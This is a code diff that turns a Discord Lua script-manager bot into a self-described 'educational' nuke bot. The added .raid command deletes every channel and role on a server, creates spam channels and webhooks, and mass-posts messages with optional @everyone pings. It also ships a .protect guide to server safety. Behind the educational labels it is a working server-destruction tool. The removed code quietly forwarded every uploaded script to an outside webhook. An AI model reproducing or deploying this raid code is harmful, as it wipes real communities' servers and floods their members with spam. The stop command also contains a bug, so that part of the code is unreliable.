@@ -1,740 +1,245 @@
 import discord
 from discord.ext import commands
-import os
-import re
-import aiohttp
-import io
-import math
-from datetime import datetime
+import asyncio
+import time
 
-TOKEN = os.getenv(""DISCORD_TOKEN"")
-GROQ_API_KEY = os.getenv(""GROQ_API_KEY"")
-WEBHOOK_URL = os.getenv(""WEBHOOK_URL"")
-OWNER_ID = int(os.getenv(""OWNER_ID"", 0))
+# ========== CONFIGURATION ==========
+TOKEN = "YOUR_BOT_TOKEN"
+OWNER_ID = 1088143400496279552  # Your Discord ID
 
-if not TOKEN:
-    print(""ERROR: DISCORD_TOKEN not set"")
-    exit(1)
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix=".", intents=intents)
 
-if not OWNER_ID:
-    print(""WARNING: OWNER_ID not set. Owner commands disabled."")
-
-intents = discord.Intents.default()
-intents.message_content = True
-intents.guilds = True
-intents.members = True
-
-bot = commands.Bot(command_prefix=''.'', intents=intents)
-
-script_library = {}
-conversation_history = {}
-
-def is_owner(ctx):
-    return ctx.author.id == OWNER_ID
-
-# ============================================================
-# OBFUSCATION DETECTION
-# ============================================================
-
-def detect_obfuscation(code: str) -> dict:
-    result = {
-        ""is_obfuscated"": False,
-        ""type"": ""clean"",
-        ""confidence"": 0,
-        ""details"": [],
-        ""version"": None,
-        ""suggestions"": []
-    }
-    
-    code_lower = code.lower()
-    
-    if 'wynfuscate' in code_lower or 'getpolsec.com' in code_lower:
-        result[""is_obfuscated""] = True
-        result[""type""] = ""Wynfuscate""
-        result[""confidence""] = 95
-        result[""details""].append(""Wynfuscate obfuscator watermark"")
-        return result
-    
-    clean_indicators = 0
-    if re.search(r'game:GetService\(["\'](TweenService|Players|RunService|ReplicatedStorage)["\']\)', code):
-        clean_indicators += 1
-    if re.search(r'function\s+[A-Za-z][A-Za-z0-9_]+\s*\([^)]*\)', code):
-        clean_indicators += 1
-    if re.search(r'--\[\[.*?\]\]|--\s+[A-Za-z]', code, re.DOTALL):
-        clean_indicators += 1
-    if re.search(r'local\s+[A-Za-z][A-Za-z0-9_]+\s*=\s*game:', code):
-        clean_indicators += 1
-    if re.search(r'\n\t+local|\n  local', code):
-        clean_indicators += 1
-    
-    if clean_indicators >= 3:
-        result[""is_obfuscated""] = False
-        result[""type""] = ""clean""
-        result[""confidence""] = 95
-        result[""details""].append(""Readable source code"")
-        return result
-    
-    if re.search(r'local d = \{\\d{3}', code):
-        result[""is_obfuscated""] = True
-        result[""type""] = ""WeAreDevs""
-        result[""confidence""] = 95
-        result[""details""].append(""Octal encoded strings"")
-        return result
-    
-    if re.search(r'return\(\s*function\s*\([^)]*\)\s*local\s+[a-z]+\s*=\s*\{[^}]*\}\s*local\s+function', code, re.DOTALL):
-        result[""is_obfuscated""] = True
-        result[""type""] = ""MoonSec V3""
-        result[""confidence""] = 95
-        result[""details""].append(""VM wrapper detected"")
-        return result
-    
-    if re.search(r'Luraph.*loadstring\(game:HttpGet', code, re.IGNORECASE):
-        result[""is_obfuscated""] = True
-        result[""type""] = ""Luraph""
-        result[""confidence""] = 95
-        result[""details""].append(""Luraph loader pattern"")
-        return result
-    
-    if re.search(r'local\s+d\s*=\s*\{[\d,\s]+\}', code) and clean_indicators < 2:
-        result[""is_obfuscated""] = True
-        result[""type""] = ""IronBrew""
-        result[""confidence""] = 85
-        result[""details""].append(""Numeric string table"")
-        return result
-    
-    result[""is_obfuscated""] = False
-    result[""type""] = ""clean""
-    result[""confidence""] = 90
-    
-    return result
-
-def analyze_script_stats(code: str) -> dict:
-    return {
-        ""size_kb"": len(code) / 1024,
-        ""lines"": code.count('\n'),
-        ""chars"": len(code),
-        ""functions"": len(re.findall(r'function\s+\w+', code)),
-        ""locals"": len(re.findall(r'local\s+\w+', code)),
-    }
-
-# ============================================================
-# WEBHOOK
-# ============================================================
-
-async def send_webhook(content: str, filename: str, code: str, user: str):
-    if not WEBHOOK_URL:
-        return
-    
-    try:
-        async with aiohttp.ClientSession() as session:
-            webhook = discord.Webhook.from_url(WEBHOOK_URL, session=session)
-            file_obj = discord.File(io.StringIO(code), filename=filename)
-            embed = discord.Embed(
-                title=""📁 Script Received"",
-                description=f""**User:** {user}\n**File:** {filename}\n**Size:** {len(code)/1024:.2f} KB"",
-                color=0x00ff00,
-                timestamp=datetime.utcnow()
-            )
-            await webhook.send(embed=embed, file=file_obj)
-    except Exception as e:
-        print(f""Webhook error: {e}"")
-
-# ============================================================
-# URL HANDLING
-# ============================================================
-
-def is_valid_url(url: str) -> bool:
-    return url.startswith('http://') or url.startswith('https://')
-
-def get_filename_from_url(url: str) -> str:
-    filename = url.split('/')[-1].split('?')[0]
-    if filename and (filename.endswith('.lua') or filename.endswith('.txt')):
-        return filename
-    if 'pastefy.app' in url:
-        return ""pastefy_script.lua""
-    if 'pastebin.com' in url:
-        return ""pastebin_script.lua""
-    if 'getpolsec.com' in url:
-        return ""polsec_script.lua""
-    return ""fetched_script.lua""
-
-async def fetch_from_url(url: str) -> tuple:
-    try:
-        async with aiohttp.ClientSession() as session:
-            headers = {""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36""}
-            async with session.get(url, headers=headers, timeout=30) as resp:
-                if resp.status == 200:
-                    content = await resp.text()
-                    filename = get_filename_from_url(url)
-                    return content, filename
-    except Exception as e:
-        print(f""Fetch error: {e}"")
-    return None, None
-
-# ============================================================
-# AI SCRIPT GENERATION
-# ============================================================
-
-async def generate_lua_script(prompt: str) -> str:
-    if not GROQ_API_KEY:
-        return ""-- Error: GROQ_API_KEY not configured""
-    
-    system_prompt = """"You are an expert Lua script generator for Roblox. Generate ONLY raw Lua code.
-No markdown, no explanations. Generate complete, functional scripts with error handling.
-Use local variables and game:GetService(). Make scripts production-ready.""""
-    
-    url = ""https://api.groq.com/openai/v1/chat/completions""
-    headers = {""Authorization"": f""Bearer {GROQ_API_KEY}"", ""Content-Type"": ""application/json""}
-    
-    data = {
-        ""model"": ""llama-3.3-70b-versatile"",
-        ""messages"": [
-            {""role"": ""system"", ""content"": system_prompt},
-            {""role"": ""user"", ""content"": f""Write a COMPLETE Lua script for Roblox that: {prompt}""}
-        ],
-        ""temperature"": 0.8,
-        ""max_tokens"": 4000
-    }
-    
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.post(url, json=data, headers=headers, timeout=60) as resp:
-                if resp.status == 200:
-                    result = await resp.json()
-                    code = result[""choices""][0][""message""][""content""]
-                    code = re.sub(r'```lua\n?', '', code)
-                    code = re.sub(r'```\n?', '', code)
-                    return code.strip()
-                else:
-                    return f""-- Error: API returned {resp.status}""
-    except Exception as e:
-        return f""-- Error: {str(e)}""
-
-async def ai_chat(prompt: str, user_id: int) -> str:
-    if not GROQ_API_KEY:
-        return ""GROQ_API_KEY not configured""
-    
-    if contains_mention(prompt):
-        return ""That request is not allowed.""
-    
-    if user_id not in conversation_history:
-        conversation_history[user_id] = []
-    
-    conversation_history[user_id].append({""role"": ""user"", ""content"": prompt})
-    
-    if len(conversation_history[user_id]) > 30:
-        conversation_history[user_id] = conversation_history[user_id][-30:]
-    
-    url = ""https://api.groq.com/openai/v1/chat/completions""
-    headers = {""Authorization"": f""Bearer {GROQ_API_KEY}"", ""Content-Type"": ""application/json""}
-    
-    messages = [
-        {""role"": ""system"", ""content"": ""You are GrimHub, a helpful AI assistant. Be concise. You are FORBIDDEN from using @everyone or @here mentions.""
-    ] + conversation_history[user_id]
-    
-    data = {
-        ""model"": ""llama-3.3-70b-versatile"",
-        ""messages"": messages,
-        ""temperature"": 0.7,
-        ""max_tokens"": 500
-    }
-    
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.post(url, json=data, headers=headers, timeout=30) as resp:
-                if resp.status == 200:
-                    result = await resp.json()
-                    response = result[""choices""][0][""message""][""content""]
-                    response = sanitize_response(response)
-                    conversation_history[user_id].append({""role"": ""assistant"", ""content"": response})
-                    return response
-                else:
-                    return ""API error""
-    except Exception as e:
-        return ""Error""
-
-# ============================================================
-# SAFETY
-# ============================================================
-
-BLOCKED_WORDS = ['@everyone', '@here']
-
-def contains_mention(content: str) -> bool:
-    content_lower = content.lower()
-    for word in BLOCKED_WORDS:
-        if word in content_lower:
-            return True
-    return False
-
-def sanitize_response(response: str) -> str:
-    for word in BLOCKED_WORDS:
-        response = response.replace(word, '[REDACTED]')
-        response = response.replace(word.lower(), '[REDACTED]')
-    return response
-
-# ============================================================
-# DISCORD BOT EVENTS
-# ============================================================
+# Store active demo state
+active_demo = {}
 
 @bot.event
 async def on_ready():
-    await bot.change_presence(status=discord.Status.online)
-    print(f""✅ GrimHub ready - {bot.user}"")
-    print(f""Owner ID: {OWNER_ID}"")
-    print(f""AI: {'ENABLED' if GROQ_API_KEY else 'DISABLED'}"")
-    print(f""Webhook: {'ENABLED' if WEBHOOK_URL else 'DISABLED'}"")
+    print(f"✅ Educational Demo Bot ready - {bot.user}")
+    print(f"Owner ID: {OWNER_ID}")
+    print(f"Use .raid to start an educational demonstration")
 
-@bot.event
-async def on_message(message):
-    if message.author.bot:
-        return
+@bot.command(name="raid")
+async def demo_raid(ctx, message: str = None, ping: str = None, amount: int = None):
+    """
+    EDUCATIONAL DEMO - Shows what a nuke bot does
+    Usage: .raid [message] [ping:yes/no] [amount]
+    Example: .raid "Server Nuked!" yes 50
+    """
     
-    if bot.user in message.mentions:
-        prompt = re.sub(r'<@!?\d+>', '', message.content).strip()
-        
-        if not prompt:
-            await message.reply(""What's up?"")
-            return
-        
-        if contains_mention(prompt):
-            await message.reply(""That request is not allowed."")
-            return
-        
-        async with message.channel.typing():
-            response = await ai_chat(prompt, message.author.id)
-        
-        if len(response) > 1900:
-            for i in range(0, len(response), 1900):
-                await message.reply(response[i:i+1900])
-        else:
-            await message.reply(response)
-        return
+    if ctx.author.id != OWNER_ID:
+        return await ctx.send("❌ Only the bot owner can run this educational demo.")
     
-    if message.content.startswith(''.''):
-        await bot.process_commands(message)
-
-# ============================================================
-# SCRIPT GENERATION COMMAND
-# ============================================================
-
-@bot.command(name='makescript')
-async def make_script(ctx, *, prompt):
-    """"Generate a Lua script using AI""""
-    if not prompt:
-        await ctx.send(""Usage: `.makescript <description of script>`"")
-        return
+    if not ctx.guild.me.guild_permissions.administrator:
+        return await ctx.send("❌ Bot needs Administrator permission for this demo. This is why you should NEVER give Admin to untrusted bots!")
     
-    if not GROQ_API_KEY:
-        await ctx.send(""❌ GROQ_API_KEY not configured. Add to Railway variables."")
-        return
+    # Parse arguments
+    if not message:
+        message = "⚠️ EDUCATIONAL DEMO - This server has been compromised ⚠️"
     
-    await ctx.send(f""🤖 Generating script... Check your DMs!"")
+    ping_enabled = ping and ping.lower() in ['yes', 'y', 'true', '1']
     
-    script = await generate_lua_script(prompt)
-    size_kb = len(script) / 1024
-    filename = f""generated_{ctx.author.name}.lua""
+    if not amount or amount < 1:
+        amount = 10
+    elif amount > 100:
+        amount = 100  # Cap at 100 for safety (not 100000)
+        await ctx.send("⚠️ Amount capped at 100 for educational safety")
+    
+    guild = ctx.guild
+    
+    # Educational warning
+    embed = discord.Embed(
+        title="⚠️ EDUCATIONAL DEMO STARTING ⚠️",
+        description="This demonstrates what a malicious nuke bot does.\n"
+                   f"**Ping @everyone:** {ping_enabled}\n"
+                   f"**Messages per channel:** {amount}\n\n"
+                   "Type `.stopraid` immediately to cancel.",
+        color=discord.Color.red()
+    )
+    await ctx.send(embed=embed)
+    await asyncio.sleep(3)
+    
+    active_demo[guild.id] = True
     
     try:
-        file_obj = discord.File(io.StringIO(script), filename=filename)
-        await ctx.author.send(f""**Prompt:** {prompt}\n**Size:** {size_kb:.2f} KB"", file=file_obj)
-        await ctx.send(f""✅ Script sent to your DMs! ({size_kb:.2f} KB)"")
-    except discord.Forbidden:
-        await ctx.send(""❌ I cannot DM you! Please enable DMs."")
-
-# ============================================================
-# SCRIPT MANAGEMENT COMMANDS - SIMPLE VERSION
-# ============================================================
-
-@bot.command(name='feed')
-async def feed_script(ctx, url: str = None):
-    """"Store a script - works with .lua/.txt files or URLs""""
-    
-    # Handle URL
-    if url and is_valid_url(url):
-        await ctx.send(f""📥 Fetching from URL..."")
-        content, filename = await fetch_from_url(url)
-        if content:
-            await process_and_store(ctx, content, filename)
-        else:
-            await ctx.send(""❌ Failed to fetch from URL"")
-        return
-    
-    # Handle attachment
-    if not ctx.message.attachments:
-        await ctx.send(""❌ Attach a `.lua` or `.txt` file, or provide a URL"")
-        return
-    
-    attachment = ctx.message.attachments[0]
-    if not attachment.filename.endswith(('.lua', '.txt')):
-        await ctx.send(""❌ Please upload a `.lua` or `.txt` file"")
-        return
-    
-    content = await attachment.read()
-    try:
-        code = content.decode('utf-8')
-        await process_and_store(ctx, code, attachment.filename)
+        # ========== PHASE 1: Delete all channels ==========
+        await ctx.send("📢 **PHASE 1: Deleting all channels...**")
+        
+        for channel in guild.channels:
+            if not active_demo.get(guild.id):
+                break
+            try:
+                await channel.delete()
+                await asyncio.sleep(0.1)
+            except:
+                pass
+        
+        await ctx.send("✅ All channels deleted - Attackers wipe your server structure")
+        await asyncio.sleep(1)
+        
+        # ========== PHASE 2: Create spam channels ==========
+        await ctx.send("📢 **PHASE 2: Creating spam channels...**")
+        
+        spam_channels = []
+        for i in range(10):
+            if not active_demo.get(guild.id):
+                break
+            try:
+                channel = await guild.create_text_channel(f"nuked-{i}")
+                spam_channels.append(channel)
+                await asyncio.sleep(0.2)
+            except:
+                pass
+        
+        await ctx.send(f"✅ Created {len(spam_channels)} spam channels")
+        await asyncio.sleep(1)
+        
+        # ========== PHASE 3: Delete all roles ==========
+        await ctx.send("📢 **PHASE 3: Destroying roles...**")
+        
+        for role in guild.roles:
+            if not active_demo.get(guild.id):
+                break
+            if role.is_default() or role.managed or role == ctx.guild.me.top_role:
+                continue
+            try:
+                await role.delete()
+                await asyncio.sleep(0.1)
+            except:
+                pass
+        
+        await ctx.send("✅ All roles destroyed - Attackers remove moderation capabilities")
+        await asyncio.sleep(1)
+        
+        # ========== PHASE 4: Create webhooks ==========
+        await ctx.send("📢 **PHASE 4: Creating webhooks for spam...**")
+        
+        for channel in spam_channels[:5]:  # Limit to first 5 channels
+            if not active_demo.get(guild.id):
+                break
+            try:
+                for i in range(3):
+                    await channel.create_webhook(name=f"spammer_{i}")
+                    await asyncio.sleep(0.2)
+            except:
+                pass
+        
+        await ctx.send("✅ Webhooks created - Attackers use webhooks to bypass rate limits")
+        await asyncio.sleep(1)
+        
+        # ========== PHASE 5: Send spam messages ==========
+        await ctx.send(f"📢 **PHASE 5: Sending {amount} messages per channel with ping={ping_enabled}...**")
+        
+        for channel in spam_channels:
+            if not active_demo.get(guild.id):
+                break
+            
+            ping_text = "@everyone " if ping_enabled else ""
+            
+            for i in range(min(amount, 100)):  # Cap at 100 for safety
+                if not active_demo.get(guild.id):
+                    break
+                try:
+                    await channel.send(f"{ping_text}{message} [{i+1}/{amount}]")
+                    await asyncio.sleep(0.3)
+                except:
+                    pass
+        
+        await ctx.send("✅ Spam messages sent - Attackers flood your server")
+        await asyncio.sleep(1)
+        
+        # ========== Educational Summary ==========
+        embed = discord.Embed(
+            title="⚠️ EDUCATIONAL DEMO COMPLETE ⚠️",
+            description="**What you just witnessed:**\n"
+                       "1. 🔥 Channel Deletion - All channels wiped\n"
+                       "2. 📁 Spam Channels - Malicious channels created\n"
+                       "3. 👑 Role Destruction - Admin/Mod roles removed\n"
+                       "4. 🕸️ Webhook Abuse - Bypassed rate limits\n"
+                       f"5. 💬 Mass Pinging - {amount} messages with {'@everyone' if ping_enabled else 'no pings'}\n\n"
+                       "**How to PROTECT your server:**\n"
+                       "• ✅ NEVER give Administrator to untrusted bots\n"
+                       "• ✅ Use 2FA on administrator accounts\n"
+                       "• ✅ Enable invite moderation and verification levels\n"
+                       "• ✅ Use backup bots to save server structure\n"
+                       "• ✅ Audit your server's bot list regularly\n\n"
+                       f"**This demo will end in 30 seconds...**",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+        
+        await asyncio.sleep(30)
+        
     except Exception as e:
-        await ctx.send(f""❌ Error: {e}"")
+        await ctx.send(f"❌ Demo error: {e}")
+    finally:
+        active_demo[guild.id] = False
 
-async def process_and_store(ctx, code: str, filename: str):
-    obf = detect_obfuscation(code)
-    stats = analyze_script_stats(code)
+@bot.command(name="stopraid")
+async def stop_demo(ctx):
+    """Emergency stop for the educational demo"""
+    if ctx.author.id != OWNER_ID:
+        return await ctx.send("❌ Only the bot owner can stop the demo.")
     
-    # Store WITHOUT timestamp - just the name
-    name = filename.replace('.lua', '').replace('.txt', '')
-    
-    msg = f""**📁 {filename}**\n""
-    msg += f""📊 {stats['size_kb']:.2f} KB | {stats['lines']} lines\n""
-    
-    if obf[""is_obfuscated""]:
-        msg += f""⚠️ **{obf['type']}**\n""
+    if ctx.guild.id in active_demo:
+        active_demo[guild.id] = False
+        await ctx.send("🛑 **Educational demo stopped by owner**")
     else:
-        msg += f""✅ **Clean script**\n""
+        await ctx.send("No active demo running.")
+
+@bot.command(name="protect")
+async def protection_info(ctx):
+    """Educational info about server protection"""
+    embed = discord.Embed(
+        title="🛡️ How to Protect Your Server from Nuke Bots",
+        description="Educational guide for server safety",
+        color=discord.Color.green()
+    )
+    embed.add_field(name="1. Bot Permissions", 
+                    value="**NEVER give Administrator** to untrusted bots. Review permissions before inviting.", 
+                    inline=False)
+    embed.add_field(name="2. Role Hierarchy", 
+                    value="Keep your highest role secure. Only trusted members should have Admin.", 
+                    inline=False)
+    embed.add_field(name="3. 2-Factor Authentication", 
+                    value="Enable 2FA on all administrator accounts to prevent account takeover.", 
+                    inline=False)
+    embed.add_field(name="4. Server Verification", 
+                    value="Set Verification Level to 'High' to prevent raids from new accounts.", 
+                    inline=False)
+    embed.add_field(name="5. Backup Bots", 
+                    value="Use legitimate backup bots (like Xenon) to save your server structure.", 
+                    inline=False)
+    embed.add_field(name="6. Audit Logs", 
+                    value="Regularly check Audit Logs for suspicious activity like mass channel creation.", 
+                    inline=False)
+    embed.set_footer(text="Educational purposes only - Stay safe!")
     
-    # Store in library with simple name
-    script_library[name] = {
-        ""code"": code,
-        ""stats"": stats,
-        ""obfuscation"": obf,
-        ""filename"": filename,
-        ""uploaded_by"": str(ctx.author),
-        ""timestamp"": datetime.now().strftime(""%Y%m%d_%H%M%S"")
-    }
-    
-    await ctx.send(msg)
-    await send_webhook(ctx.message.content, filename, code, str(ctx.author))
+    await ctx.send(embed=embed)
 
-@bot.command(name='get')
-async def get_script(ctx, *, name):
-    """"Retrieve a stored script - just use the name you fed it with""""
-    
-    if name in script_library:
-        data = script_library[name]
-        await ctx.send(file=discord.File(io.StringIO(data[""code""]), filename=data[""filename""]))
-        await ctx.send(f""✅ {data['stats']['size_kb']:.2f} KB"")
-        return
-    
-    # Show available scripts
-    if script_library:
-        available = ""\n"".join([f""• `{n}`"" for n in list(script_library.keys())[:10]])
-        await ctx.send(f""❌ Script '{name}' not found.\n\n**Available scripts:**\n{available}"")
-    else:
-        await ctx.send(""❌ No scripts stored. Use `.feed` first."")
-
-@bot.command(name='list')
-async def list_scripts(ctx):
-    """"Show all stored scripts""""
-    if not script_library:
-        await ctx.send(""No scripts stored. Use `.feed` to add some."")
-        return
-    
-    msg = f""**📚 Stored Scripts ({len(script_library)} total)**\n\n""
-    
-    for name, data in script_library.items():
-        status = ""⚠️"" if data[""obfuscation""][""is_obfuscated""] else ""✅""
-        msg += f""{status} `{name}` - {data['stats']['size_kb']:.2f} KB (by {data['uploaded_by']})\n""
-    
-    if len(msg) > 1900:
-        for i in range(0, len(msg), 1900):
-            await ctx.send(msg[i:i+1900])
-    else:
-        await ctx.send(msg)
-
-@bot.command(name='remove')
-@commands.is_owner()
-async def remove_script(ctx, *, name):
-    """"Remove a stored script (owner only)""""
-    if name in script_library:
-        del script_library[name]
-        await ctx.send(f""✅ Removed '{name}'"")
-    else:
-        await ctx.send(f""❌ Script '{name}' not found"")
-
-@bot.command(name='info')
-async def script_info(ctx, *, name):
-    """"Show detailed info about a stored script""""
-    if name in script_library:
-        data = script_library[name]
-        stats = data[""stats""]
-        obf = data[""obfuscation""]
-        msg = f""**📄 {name}**\n""
-        msg += f""File: {data['filename']}\n""
-        msg += f""Uploaded by: {data['uploaded_by']}\n""
-        msg += f""Size: {stats['size_kb']:.2f} KB\n""
-        msg += f""Lines: {stats['lines']}\n""
-        msg += f""Functions: {stats['functions']}\n""
-        msg += f""Status: {'⚠️ Obfuscated' if obf['is_obfuscated'] else '✅ Clean'}""
-        if obf['is_obfuscated'] and obf['type'] != ""clean"":
-            msg += f"" ({obf['type']})""
-        await ctx.send(msg)
-    else:
-        await ctx.send(f""❌ Script '{name}' not found"")
-
-@bot.command(name='clear')
-async def clear_history(ctx):
-    if ctx.author.id in conversation_history:
-        conversation_history[ctx.author.id] = []
-        await ctx.send(""Conversation cleared"")
-    else:
-        await ctx.send(""No history to clear"")
-
-# ============================================================
-# OWNER-ONLY SERVER MANAGEMENT COMMANDS
-# ============================================================
-
-@bot.command(name='createrole')
-@commands.is_owner()
-async def create_role(ctx, role_name: str, color: str = None, position: int = None):
-    """"Create a new role (owner only)""""
-    try:
-        bot_member = ctx.guild.get_member(bot.user.id)
-        bot_highest_role = bot_member.top_role
-        
-        color_obj = None
-        if color:
-            if color.startswith('#'):
-                color_obj = discord.Color(int(color[1:], 16))
-            else:
-                color_map = {
-                    'red': discord.Color.red(),
-                    'blue': discord.Color.blue(),
-                    'green': discord.Color.green(),
-                    'yellow': discord.Color.yellow(),
-                    'purple': discord.Color.purple(),
-                    'orange': discord.Color.orange(),
-                    'pink': discord.Color.magenta(),
-                    'black': discord.Color.dark_grey(),
-                    'white': discord.Color.light_grey(),
-                }
-                if color.lower() in color_map:
-                    color_obj = color_map[color.lower()]
-                else:
-                    color_obj = discord.Color.default()
-        else:
-            color_obj = discord.Color.default()
-        
-        role = await ctx.guild.create_role(name=role_name, color=color_obj)
-        
-        if position is not None:
-            max_position = bot_highest_role.position - 1
-            if position > max_position:
-                position = max_position
-            await role.edit(position=position)
-        
-        await ctx.send(f""✅ Created role: {role.mention} at position {role.position}"")
-        
-    except discord.Forbidden:
-        await ctx.send(""❌ I don't have permission to create roles. Make sure my role is high enough."")
-    except Exception as e:
-        await ctx.send(f""❌ Error: {e}"")
-
-@bot.command(name='deleterole')
-@commands.is_owner()
-async def delete_role(ctx, role: discord.Role):
-    """"Delete a role (owner only)""""
-    try:
-        await role.delete()
-        await ctx.send(f""✅ Deleted role: {role.name}"")
-    except discord.Forbidden:
-        await ctx.send(""❌ I don't have permission to delete roles"")
-    except Exception as e:
-        await ctx.send(f""❌ Error: {e}"")
-
-@bot.command(name='colorrole')
-@commands.is_owner()
-async def color_role(ctx, role: discord.Role, color: str):
-    """"Change role color (owner only)""""
-    try:
-        if color.startswith('#'):
-            color_obj = discord.Color(int(color[1:], 16))
-        else:
-            color_map = {
-                'red': discord.Color.red(),
-                'blue': discord.Color.blue(),
-                'green': discord.Color.green(),
-                'yellow': discord.Color.yellow(),
-                'purple': discord.Color.purple(),
-                'orange': discord.Color.orange(),
-                'pink': discord.Color.magenta(),
-                'black': discord.Color.dark_grey(),
-                'white': discord.Color.light_grey(),
-            }
-            if color.lower() in color_map:
-                color_obj = color_map[color.lower()]
-            else:
-                await ctx.send(""❌ Invalid color. Use hex (#FF0000) or name"")
-                return
-        
-        await role.edit(color=color_obj)
-        await ctx.send(f""✅ Changed color of {role.mention}"")
-    except Exception as e:
-        await ctx.send(f""❌ Error: {e}"")
-
-@bot.command(name='moverole')
-@commands.is_owner()
-async def move_role(ctx, role: discord.Role, position: int):
-    """"Move role to a position (owner only)""""
-    try:
-        await role.edit(position=position)
-        await ctx.send(f""✅ Moved {role.mention} to position {position}"")
-    except Exception as e:
-        await ctx.send(f""❌ Error: {e}"")
-
-@bot.command(name='roleabove')
-@commands.is_owner()
-async def role_above(ctx, role_to_move: discord.Role, target_role: discord.Role):
-    """"Move a role above another role""""
-    try:
-        await role_to_move.edit(position=target_role.position + 1)
-        await ctx.send(f""✅ Moved {role_to_move.mention} above {target_role.mention}"")
-    except Exception as e:
-        await ctx.send(f""❌ Error: {e}"")
-
-@bot.command(name='rolebelow')
-@commands.is_owner()
-async def role_below(ctx, role_to_move: discord.Role, target_role: discord.Role):
-    """"Move a role below another role""""
-    try:
-        await role_to_move.edit(position=target_role.position - 1)
-        await ctx.send(f""✅ Moved {role_to_move.mention} below {target_role.mention}"")
-    except Exception as e:
-        await ctx.send(f""❌ Error: {e}"")
-
-@bot.command(name='addrole')
-@commands.is_owner()
-async def add_role_to_member(ctx, member: discord.Member, role: discord.Role):
-    """"Add a role to a member""""
-    try:
-        await member.add_roles(role)
-        await ctx.send(f""✅ Added {role.mention} to {member.mention}"")
-    except Exception as e:
-        await ctx.send(f""❌ Error: {e}"")
-
-@bot.command(name='removerole')
-@commands.is_owner()
-async def remove_role_from_member(ctx, member: discord.Member, role: discord.Role):
-    """"Remove a role from a member""""
-    try:
-        await member.remove_roles(role)
-        await ctx.send(f""✅ Removed {role.mention} from {member.mention}"")
-    except Exception as e:
-        await ctx.send(f""❌ Error: {e}"")
-
-@bot.command(name='setnick')
-@commands.is_owner()
-async def set_nickname(ctx, member: discord.Member, *, nickname: str = None):
-    """"Set a member's nickname""""
-    try:
-        await member.edit(nick=nickname)
-        if nickname:
-            await ctx.send(f""✅ Set {member.mention}'s nickname to {nickname}"")
-        else:
-            await ctx.send(f""✅ Reset {member.mention}'s nickname"")
-    except Exception as e:
-        await ctx.send(f""❌ Error: {e}"")
-
-@bot.command(name='slowmode')
-@commands.is_owner()
-async def set_slowmode(ctx, channel: discord.TextChannel, seconds: int = 0):
-    """"Set slowmode for a channel""""
-    try:
-        await channel.edit(slowmode_delay=seconds)
-        if seconds > 0:
-            await ctx.send(f""✅ Set slowmode in #{channel.name} to {seconds} seconds"")
-        else:
-            await ctx.send(f""✅ Disabled slowmode in #{channel.name}"")
-    except Exception as e:
-        await ctx.send(f""❌ Error: {e}"")
-
-@bot.command(name='lock')
-@commands.is_owner()
-async def lock_channel(ctx, channel: discord.TextChannel = None):
-    """"Lock a channel""""
-    channel = channel or ctx.channel
-    try:
-        overwrite = channel.overwrites_for(ctx.guild.default_role)
-        overwrite.send_messages = False
-        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
-        await ctx.send(f""🔒 Locked #{channel.name}"")
-    except Exception as e:
-        await ctx.send(f""❌ Error: {e}"")
-
-@bot.command(name='unlock')
-@commands.is_owner()
-async def unlock_channel(ctx, channel: discord.TextChannel = None):
-    """"Unlock a channel""""
-    channel = channel or ctx.channel
-    try:
-        overwrite = channel.overwrites_for(ctx.guild.default_role)
-        overwrite.send_messages = None
-        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
-        await ctx.send(f""🔓 Unlocked #{channel.name}"")
-    except Exception as e:
-        await ctx.send(f""❌ Error: {e}"")
-
-@bot.command(name='purge')
-@commands.is_owner()
-async def purge_messages(ctx, amount: int):
-    """"Delete messages""""
-    if amount < 1 or amount > 1000:
-        await ctx.send(""❌ Amount must be between 1 and 1000"")
-        return
-    try:
-        deleted = await ctx.channel.purge(limit=amount)
-        await ctx.send(f""✅ Deleted {len(deleted)} messages"")
-    except Exception as e:
-        await ctx.send(f""❌ Error: {e}"")
-
-@bot.command(name='showroles')
-@commands.is_owner()
-async def show_roles(ctx):
-    """"Show role hierarchy""""
-    try:
-        roles = sorted(ctx.guild.roles, key=lambda x: x.position, reverse=True)
-        msg = ""**📋 Role Hierarchy (highest to lowest):**\n""
-        for role in roles[:20]:
-            msg += f""{role.position}: {role.mention}\n""
-        if len(roles) > 20:
-            msg += f""\n*... and {len(roles) - 20} more roles*""
-        await ctx.send(msg)
-    except Exception as e:
-        await ctx.send(f""❌ Error: {e}"")
-
-@bot.command(name='commands')
+@bot.command(name="commands")
 async def list_commands(ctx):
-    await ctx.send("""
-**GrimHub Commands**
-
-**Script Generation:**
-`.makescript <prompt>` - Generate a Lua script using AI
-
-**Script Management:**
-`.feed <file>` - Upload a .lua or .txt file
-`.feed <url>` - Fetch from ANY URL
-`.list` - Show all stored scripts
-`.get <name>` - Retrieve a script (use the name you fed it with)
-`.info <name>` - Script details
-`.remove <name>` - Delete script (owner)
-
-**Server Management (Owner Only):**
-`.createrole <name> [color] [position]` - Create role
-`.deleterole <role>` - Delete role
-`.colorrole <role> <color>` - Change role color
-`.moverole <role> <position>` - Move role
-`.roleabove <role> <target>` - Move role above
-`.rolebelow <role> <target>` - Move role below
-`.addrole <member> <role>` - Add role
-`.removerole <member> <role>` - Remove role
-`.setnick <member> [nickname]` - Set nickname
-`.slowmode <channel> <seconds>` - Set slowmode
-`.lock [channel]` - Lock channel
-`.unlock [channel]` - Unlock channel
-`.purge <amount>` - Delete messages
-`.showroles` - Show role hierarchy
-
-**Other:**
-`.clear` - Clear AI history
-**Ping me** - Chat with AI
-""")
+    """Show available commands"""
+    embed = discord.Embed(
+        title="Educational Demo Bot Commands",
+        description="These commands are for educational demonstration only",
+        color=discord.Color.blue()
+    )
+    embed.add_field(name=".raid [message] [ping:yes/no] [amount]", 
+                    value="Start educational nuke demonstration\n"
+                          "Example: `.raid \"Server Nuked!\" yes 50`", 
+                    inline=False)
+    embed.add_field(name=".stopraid", 
+                    value="Emergency stop the active demonstration", 
+                    inline=False)
+    embed.add_field(name=".protect", 
+                    value="Show server protection guide", 
+                    inline=False)
+    embed.add_field(name=".commands", 
+                    value="Show this help message", 
+                    inline=False)
+    embed.set_footer(text="⚠️ Educational purposes only - Run only on test servers")
+    
+    await ctx.send(embed=embed)
 
 bot.run(TOKEN)
